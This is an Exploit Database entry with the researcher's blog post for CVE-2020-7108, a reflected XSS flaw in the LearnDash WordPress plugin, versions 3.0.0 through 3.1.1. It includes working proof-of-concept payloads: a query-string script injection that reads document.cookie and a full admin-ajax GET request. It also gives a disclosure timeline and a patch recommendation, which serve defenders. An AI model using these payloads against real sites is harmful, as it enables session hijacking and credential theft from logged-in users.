# Author Advisory: https://www.getastra.com/blog/911/plugin-exploit/reflected-xss-vulnerability-found-in-learndash-lms-plugin/
# Author Homepage: https://www.jinsonvarghese.com
# Version: 3.0.0 - 3.1.1
# CVE : CVE-2020-7108

1. Description

LearnDash is one of the most popular and easiest to use WordPress LMS plugins in the market. It allows users to easily create courses and sell them online and boasts a large customer base. The plugin allows users to search for courses they have subscribed to using the [ld_profile] search field, which was found to be vulnerable to reflected cross site scripting. All WordPress websites using LearnDash version 3.0.0 through 3.1.1 are affected.

2. Proof of Concept

Once the user is logged in to the WordPress website where the vulnerable LearnDash plugin is installed, the XSS payload can be inserted into the Search Your Courses box. The payload gets executed because the user input is not properly validated. As a result, passing the XSS payload as a query string in the URL will also execute the payload.

[wordpress website][learndash my-account page]?ld-profile-search=%3Cscript%3Ealert(document.cookie)%3C/script%3E

An attacker can modify the above URL and use an advanced payload that could help him/her in performing malicious actions.

GET /wp-admin/admin-ajax.php?action=ld30_ajax_profile_search&shortcode_instance%5Buser_id%5D=1&shortcode_instance%5Bper_page%5D=20&shortcode_instance%5Border%5D=DESC&shortcode_instance%5Borderby%5D=ID&shortcode_instance%5Bcourse_points_user%5D=yes&shortcode_instance%5Bexpand_all%5D=false&shortcode_instance%5Bprofile_link%5D=true&shortcode_instance%5Bshow_header%5D=yes&shortcode_instance%5Bshow_quizzes%5D=true&shortcode_instance%5Bshow_search%5D=yes&shortcode_instance%5Bquiz_num%5D=20&shortcode_instance%5Bpaged%5D=1&shortcode_instance%5Bs%5D=&ld-profile-search=%3Cscript%3Ealert(123)%3C%2Fscript%3E HTTP/1.1

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

# Reflected XSS in LearnDash WordPress Plugin

January 15, 20202 min read

![](https://www.jinsonvarghese.com/wp-content/uploads/2020/01/LearnDash-1-1128x484.png)

While performing a security audit on one of our client’s website, I discovered a reflected cross-site scripting (XSS) vulnerability in the WordPress LMS plugin by LearnDash. All WordPress websites using LearnDash version 3.0.0 through 3.1.1 are affected.

**[CVE-2020-7108](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7108)**

## **Summary**

LearnDash is one of the most popular and easiest to use WordPress LMS plugins on the market. It allows users to easily create courses and sell them online and boasts a large customer base. The XSS vulnerability in LearnDash can be exploited by attackers against authenticated users to perform malicious actions such as stealing the victim’s session cookies or login credentials, performing arbitrary actions on the victim’s behalf, logging their keystrokes and more.

## **Vulnerability**

Once the user is logged in to the WordPress website where the vulnerable LearnDash plugin is installed, the XSS payload can be inserted into the **Search Your Courses** box. The payload gets executed because the user input is not properly validated.

As a result, passing the XSS payload as a query string in the URL will also execute the payload.

`[wordpress website][learndash my-account page]?ld-profile-search=%3Cscript%3Ealert(document.cookie)%3C/script%3E`

![](https://www.jinsonvarghese.com/wp-content/uploads/2020/01/Screen-Shot-2020-01-15-at-3.48.44-PM-1024x369.png)

An attacker can modify the above URL and use an advanced payload that could help him/her in performing malicious actions.

## **Timeline**

* Vulnerability reported to the LearnDash team – January 14, 2020
* LearnDash version 3.1.2 containing the fix released – January 14, 2020

## **Recommendation**

It is highly recommended to update the plugin to the latest version (>= 3.1.2). If you are using the [Astra Security Suite](https://www.getastra.com/pricing), you are protected against this vulnerability.
